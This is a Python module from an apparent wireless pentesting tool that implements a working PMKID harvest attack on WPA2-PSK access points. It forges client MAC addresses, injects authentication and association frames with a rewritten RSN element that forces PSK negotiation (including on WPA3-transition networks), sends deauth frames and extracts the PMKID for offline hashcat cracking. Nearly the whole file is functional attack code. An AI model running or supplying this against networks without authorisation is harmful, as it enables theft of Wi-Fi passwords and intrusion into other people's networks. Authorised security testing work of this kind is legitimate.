"""PMKID harvest attack (hcxdumptool-style, native).

Sequence per attempt:
    1. Inject Auth Req (Open System, seq=1) from a forged client MAC.
    2. Listen briefly for Auth Resp (status=0 means the AP will engage).
    3. Inject Assoc Req carrying a forced-PSK RSN IE (the AP's ciphers, AKM=PSK)
       + SSID + rates — a client selects one AKM, and PSK is what yields a
       harvestable PMKID; we bail first if the AP offers no PSK AKM.
    4. Wait for the AP's EAPOL M1 — many WPA2-PSK APs ship a PMKID KDE in
       the Key Data. The existing frame parser surfaces it as
       ``parsed['eapol_pmkid']`` and the WlanInterface populates
       ``AP.handshakes[source].pmkid`` for free.
    5. Deauth the AP and stop the moment M1 arrives. M1 is terminal: we can't
       send M2 (no PSK for its MIC), so a PMKID-less M1 means this AP exposes
       none — give up rather than retry the same empty M1 — and even on success
       the deauth frees the AP from retransmitting M1 for ~5 s. We only rotate
       the MAC and retry when the AP stays *silent* (a lost Auth/Assoc).

The attack returns the harvested 16-byte PMKID, or ``None`` if the AP answers
with a PMKID-less M1 (or never answers). Cracker-side, the existing
``engine/hc22000.write_hc22000`` writes a ``WPA*01*…`` hashline whenever
``hs.pmkid`` is set.
"""

from __future__ import annotations

import asyncio
import enum
import logging
import os
import time
from typing import Optional

from wifit3.engine.models import AccessPoint
from wifit3.wlan.interface import build_deauth

from .campaign import Campaign
from .auth_assoc import Association

logger = logging.getLogger(__name__)


class PmkidFail(enum.Enum):
    """Why a PMKID harvest failed — the UI maps each to a short display line
    (engine stays markup-free; presentation/length live in the view)."""
    PMF_REQUIRED = "pmf_required"   # AP only associates protected (802.11w) clients
    NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
    NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
    NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)


def _mac_bytes_to_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


# Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
# Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
_GENERIC_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

# 00-0F-AC:2 (PSK). Our forged Assoc negotiates PSK, so any PMKID the AP returns
# is PSK-derived (crackable) — we assert it so the AKM crackability gate doesn't
# suppress a harvest on a WPA3-transition AP whose beacon also advertises SAE.
_AKM_PSK = 0x02

# AKMs whose PMK we can harvest *and* crack offline. PSK (00-0F-AC:2) is the only
# one with a hashcat mode (WPA*01) today; PSK-variants / others are crackable in
# principle but lack out-of-the-box tooling — add them here when that lands.
_HARVESTABLE_AKMS = (_AKM_PSK,)

# RSN caps MFPC bit (bit 7). Set (MFPR clear) for PMF-capable targets — a transition
# AP often only associates PMF-capable STAs.
_RSN_CAP_MFPC = 0x0080
# Group Management Cipher advertised with MFPC: BIP-CMAC-128 (00-0F-AC:6).
_BIP_CMAC_128 = b"\x00\x0f\xac\x06"


def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK, *, pmf_capable: bool = False) -> Optional[bytes]:
    """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
    AP's ciphers, authoring a client RSN tail that mirrors the AP's PMF posture:
    ``pmf_capable`` → MFPC=1 (MFPR=0) + BIP group-mgmt (a transition AP often only
    associates PMF-capable STAs); else clean 0x0000 caps. Drops the AP's PMKID list
    either way; returns None if the IE is malformed (caller falls back to generic).

    Selecting one PSK AKM (not echoing the AP's full list, which claims SAE and gets
    us ignored) runs the PSK 4-way → PMKID in M1. RSNE body layout: version(2)
    group(4) pw_count(2) pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid_count(2)
    pmkid...] [group-mgmt(4)]."""
    if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
        return None
    body = rsn_ie[2:2 + rsn_ie[1]]
    if len(body) < 8:
        return None
    pw_count = int.from_bytes(body[6:8], "little")
    akm_off = 8 + 4 * pw_count
    if akm_off + 2 > len(body):
        return None
    akm_count = int.from_bytes(body[akm_off:akm_off + 2], "little")
    akm_end = akm_off + 2 + 4 * akm_count
    if akm_end > len(body):
        return None
    new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
    if pmf_capable:                                       # MFPC=1, PMKID-count 0, BIP
        tail = _RSN_CAP_MFPC.to_bytes(2, "little") + b"\x00\x00" + _BIP_CMAC_128
    else:
        tail = b"\x00\x00"                               # clean caps, no MFP
    new_body = body[:akm_off] + new_akm + tail
    return bytes([0x30, len(new_body)]) + new_body


def _str_to_mac(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast bit clear)."""
    rnd = os.urandom(5)
    return bytes([0x02]) + rnd


class PmkidHarvestAttack(Campaign):
    """Run a PMKID harvest against a single AP."""

    # --- Focus button eligibility ---------------------------------------------
    # The button asks the harvest's OWN question, so it can never offer a harvest
    # that run() would immediately bail on. (Lifecycle migration onto Campaign is
    # a later pass; these classmethods are forward-compatible with it.)
    button_id = "btn-pmkid"
    key = "pmkid"
    hotkey = ("p", "PMKID")
    stoppable = True                   # short one-shot, but the user can Stop between attempts
    idle_label = "PMKID"
    run_label = "Stop PMKID"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """Shown when the AP advertises a harvestable (PSK) AKM, OR when its
        encryption isn't confirmed yet (no RSN IE parsed — e.g. a hidden AP heard
        only via a data frame): the latter shows the button *disabled with a reason*
        (ineligible_reason) rather than a silently-missing button. A CONFIRMED
        non-PSK AP (open / WEP / SAE-only / enterprise) still hides it, so the
        OPEN-network PMKID button bug can't recur."""
        akms = set(getattr(ap, "akm_suites", None) or ())
        if set(_HARVESTABLE_AKMS) & akms:
            return True                     # confirmed harvestable PSK
        if akms:
            return False                    # confirmed AKM(s), none harvestable
        return getattr(ap, "encryption", None) in (None, "Unknown")   # unconfirmed → disabled

    @classmethod
    def ineligible_reason(cls, ap) -> Optional[str]:
        """None (enabled) once a PSK AKM is confirmed; otherwise the 'why' shown on
        the disabled button. We only reach ``visible()`` without a PSK AKM when the
        encryption is unconfirmed, so a beacon (RSN IE) is what we're waiting on."""
        if set(_HARVESTABLE_AKMS) & set(getattr(ap, "akm_suites", None) or ()):
            return None
        return "encryption not confirmed yet (no beacon RSN)"

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        attempts: int = 3,
        m1_timeout: float = 2.0,
        log=None,
    ):
        super().__init__(ap=target, iface=iface)
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.attempts = attempts
        self.m1_timeout = m1_timeout
        # Plain-string progress sink (UI wraps each line in treelog.branch); the
        # engine stays markup-free. Defaults to a no-op for headless callers/tests.
        self.log = log or (lambda m: None)
        # Set by _loop on failure to the specific cause (PMF / PMKID-less M1 /
        # silent), so the UI reports why instead of guessing.
        self.fail_reason: Optional[PmkidFail] = None
        # Set by _loop to the harvested 16-byte PMKID on success — the screen
        # reads it (and fail_reason) once the campaign is `done`.
        self.pmkid: Optional[bytes] = None
        # True once any attempt armed active-monitor → teardown() clears it.
        self._armed = False
        # The Assoc RSN IE (single AKM=PSK), rebuilt from the AP's ciphers in _loop.
        self._assoc_rsn_ie: bytes = _GENERIC_RSN_IE
        # Register with the interface so client/handshake registration
        # ignores these MACs (they're not real clients).
        self.iface.register_forged_mac(self.source_mac)

    @property
    def client_mac(self) -> str:
        """The forged STA MAC we currently impersonate, as a colon string — the UI
        labels the harvest tree's ``Client:`` with it. Matches the handshake-dict
        key the parser populates, so it names the STA that received (or would have
        received) the M1."""
        return _mac_bytes_to_str(self.source_mac)

    def _rotate_mac(self) -> None:
        self.source_mac = _random_client_mac()
        self.iface.register_forged_mac(self.source_mac)

    # ---- Frame builders -----------------------------------------------------

    def _build_deauth(self) -> bytes:
        """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to the AP —
        Addr1=BSSID (dest), Addr2=us, Addr3=BSSID."""
        return build_deauth(self.bssid_bytes, self.source_mac, self.bssid_bytes, 3)

    # ---- Driver -------------------------------------------------------------

    def _received_m1(self):
        """The parser-created Handshake for our forged MAC on this AP once its M1
        (EAPOL-Key msg 1) lands — present the moment M1 arrives, with or without a
        PMKID; None until then. M1 is terminal for us: we can't compute M2's MIC
        without the PSK, so a PMKID-less M1 means this AP simply doesn't expose one
        (retrying the same AP would only re-fetch the same empty M1)."""
        ap_state = self.iface.access_points.get(self.target.bssid.lower())
        if not ap_state:
            return None
        return ap_state.handshakes.get(_mac_bytes_to_str(self.source_mac))

    async def _send_leaving_deauth(self, count: int = 3) -> None:
        """Deauth the AP (×count) the instant we have M1 — we never send M2, so
        otherwise the AP retransmits M1 for ~5 s waiting for it. Our deauth is
        un-ACKed (and on a card without active-monitor nothing is), so a single one
        could drop unnoticed — send a small burst so 'we're leaving' lands."""
        frame = self._build_deauth()
        for _ in range(count):
            await self.iface.send_no_wait(frame)
            await asyncio.sleep(0.003)

    async def _loop(self) -> None:
        """Try up to ``self.attempts`` association rounds, stashing the 16-byte PMKID
        on ``self.pmkid`` (success) or the cause on ``self.fail_reason``.

        Receiving M1 is terminal: we deauth (we can never answer with M2) and stop
        — with the PMKID on success, or empty-handed if this AP ships a PMKID-less
        M1 (no point retrying the same AP). We only rotate the MAC and retry when
        the AP stays *silent* (a lost Auth/Assoc in the pre-M1 dance)."""
        self.fail_reason = None

        # PMF Required: the AP only associates protected (802.11w) clients, so our
        # unprotected Auth/Assoc is ignored — no M1, no PMKID. Don't waste the air.
        if self.target.pmf_required:
            self.fail_reason = PmkidFail.PMF_REQUIRED
            logger.info("[PMKID] %s is PMF-Required — unharvestable, skipping.",
                        self.target.bssid)
            return

        # Force a single AKM = PSK in our Assoc IE (a client selects one AKM;
        # echoing the AP's full list claims SAE on a WPA3-transition AP and gets us
        # ignored). Bail if the AP offers no harvestable (PSK) AKM at all.
        akm = next((a for a in _HARVESTABLE_AKMS
                    if a in (self.target.akm_suites or ())), None)
        if akm is None:
            self.fail_reason = PmkidFail.NO_PSK_AKM
            logger.info("[PMKID] %s offers no PSK AKM (akm_suites=%s) — can't harvest.",
                        self.target.bssid, self.target.akm_suites)
            return
        # The generic is a valid RSN IE, so route it through _force_psk_akm too when
        # we never captured the AP's own — the PMF posture still applies.
        base_rsn = self.target.rsn_ie or _GENERIC_RSN_IE
        self._assoc_rsn_ie = (
            _force_psk_akm(base_rsn, akm, pmf_capable=self.target.pmf_capable) or _GENERIC_RSN_IE
        )
        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x, mfp_capable=%s): %s",
                    akm, self.target.pmf_capable, self._assoc_rsn_ie.hex())

        # Make sure we're on the AP's channel — Focus already tunes here,
        # but be defensive.
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        # Active-monitor (HW-ACK our forged MAC) lets the AP treat us as a real STA
        # and reliably emit M1. set_fake_mac returns None when the card lacks the
        # FAKE_MAC capability — Association just runs un-ACKed. Re-armed per
        # attempt (each rotates the source MAC); teardown() clears it once.
        for attempt in range(1, self.attempts + 1):
            if self.stopped:
                return
            armed = await self.iface.set_fake_mac(self.source_mac, self.bssid_bytes)
            self._armed = self._armed or (armed is not None)
            # A FIXED_MAC card returns its silicon MAC (it ACKs only that); associate/inject as
            # whatever was armed so the chip honors the ACKs. No-op for SPOOFABLE (armed == source).
            if armed:
                self.source_mac = _str_to_mac(armed)
            logger.info(
                f"[PMKID] Attempt {attempt}/{self.attempts}: Auth + Assoc Req to "
                f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
                f"{' (HW-ACKed)' if armed else ''}"
            )
            self.log(f"Auth + Assoc → {self.target.bssid}"
                     + (f" (retry {attempt})" if attempt > 1 else ""))
            # Robust auth+assoc (waits for the Auth Resp, resends while silent),
            # carrying our forged single-AKM=PSK RSN IE as the trailing assoc IE.
            assoc = Association(self.iface, self.target.bssid, self.target.ssid or "",
                                self.target.channel, our_mac=self.source_mac,
                                assoc_trailer_ies=self._assoc_rsn_ie,
                                should_stop=lambda: self.stopped)
            assoc.start()
            try:
                await assoc.associate()
            finally:
                assoc.stop()

            # Poll the parser-populated handshake dict for our forged MAC's M1.
            deadline = time.time() + self.m1_timeout
            while time.time() < deadline:
                if self.stopped:
                    return
                hs = self._received_m1()
                if hs is not None:
                    # M1 in hand — terminal. Free the air before we leave.
                    await self._send_leaving_deauth()
                    if hs.pmkid:
                        if hs.akm_client is None:
                            hs.akm_client = _AKM_PSK   # we negotiated PSK in our Assoc
                        logger.info(
                            f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                            f"(STA {_mac_bytes_to_str(self.source_mac)})"
                        )
                        self.log("M1 received — PMKID present")
                        self.pmkid = hs.pmkid
                        return
                    self.fail_reason = PmkidFail.NO_KDE
                    logger.info(
                        f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
                        f"this AP doesn't expose one; not retrying."
                    )
                    self.log("M1 received — no PMKID KDE")
                    return
                await asyncio.sleep(0.05)

            logger.info(
                f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
            )
            self.log("no M1 (AP silent) — rotating MAC")
            self._rotate_mac()

        self.fail_reason = PmkidFail.NO_RESPONSE

    async def teardown(self) -> None:
        """Release the active-monitor MAC if any attempt armed it (was _loop's finally)."""
        if self._armed:
            await self.iface.clear_fake_mac()
